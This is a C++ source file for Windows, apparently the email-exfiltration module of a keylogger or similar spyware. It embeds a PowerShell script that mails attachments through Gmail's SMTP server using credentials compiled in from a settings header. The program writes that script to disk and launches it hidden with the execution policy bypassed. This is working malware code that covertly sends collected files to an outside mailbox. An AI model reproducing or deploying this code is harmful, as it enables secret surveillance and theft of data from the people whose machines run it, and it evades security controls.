#include <fstream>
#include <algorithm>
#include <windows.h>

#include "Settings.h"
#include "IO.h"
#include "Timer.h"
#include "Utils.h"

const std::string MailUtils::PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\""
		"\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

// Undefine email login credentials from settings.h
#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS

/**
 * Replaces all instatnces of a with
 * all instatnces of b in string s
 * 
 * returns the new string
 **/
std::string StringReplace(std::string s, const std::string &a, const std::string &b)
{
	if (a.empty())
		return "";

	size_t sp = 0;

	// Update in the future
	while ((sp = s.find(a, sp)) != std::string::npos)
	{
		s.replace(sp, a.length(), b), sp += b.length();
	}

	return s;
}

// returns true if file exists, false otherwise
bool CheckFileExists(const std::string &path)
{
	std::ifstream file(path);
	bool exists = (bool)file;
	file.close();

	return exists;
}

// Creates the powershell script that sends mail
bool CreateScript()
{
	std::ofstream script(IO::GetOutputPath(true) + std::string(SCRIPT_NAME));

	if (!script)
		return false;
	script << PowerShellScript;

	if (!script)
		return false;

	script.close();
	return true;
}

Timer m_timer;

int MailUtils::SendMail(const std::string &subject, const std::string &body, const std::string &attatchment)
{
	bool ok;

	ok = IO::MKDir(IO::GetOutputPath(true));
	if (!ok)
		return -1;

	std::string scr_path = IO::GetOutputPath(true) + std::string(SCRIPT_NAME);
	if (!CheckFileExists(scr_path))
		ok = CreateScript();
	if (!ok)
		return -2;

	std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" +
											StringReplace(subject, "\"", "\\\"") + "\" -Body \"" +
											StringReplace(body, "\"", "\\\"") +
											"\" -Att \"" + attatchment + "\"";

	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "open";
	ShExecInfo.lpFile = "powershell";
	ShExecInfo.lpParameters = param.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	// Execute powershell script
	ok = (bool)ShellExecuteEx(&ShExecInfo);
	if (!ok)
		return -3;

	// Wait 7 seconds until script is done executing
	WaitForSingleObject(ShExecInfo.hProcess, 7000);

	// Get exit code of script execution through handle to the process
	DWORD exit_code = -1;
	GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

	/**
	 * Defines a lambda function that 
	 * captures all surrounding variables
	 * (exit_code is the only one used) inside
	 * the lambda body by reference. This is 
	 * why exit_code can be referenced inside
	 * the body even though it goes out of 
	 * scope when the SendMail() function exits
	 **/ 
	m_timer.SetFunction([&]()
											{
												// Wait for 60 seconds to check status of script execution
												WaitForSingleObject(ShExecInfo.hProcess, 60000);
												
												// Get status
												GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

												// If script is still running, then terminate it
												if ((int)exit_code == STILL_ACTIVE)
													TerminateProcess(ShExecInfo.hProcess, 100);

												// Log to debug file that if failed
												IO::WriteAppLog("<From SendMail> Return Code: " + Utils::ToString((int)exit_code));
											});

	// Run shell termination function asynchronously
	m_timer.SetRepeatCount(1L);
	m_timer.SetInterval(10L);
	m_timer.Start(true);

	return (int)exit_code;
}

int MailUtils::SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
{
	std::string attatchments = "";
	if (att.size() == 1U)
		attatchments = att[0];
	else
	{
		for (const auto &v : att)
			attatchments += v + "::";
		attatchments = attatchments.substr(0, attatchments.length() - 2);
	}
	return SendMail(subject, body, attatchments);
}
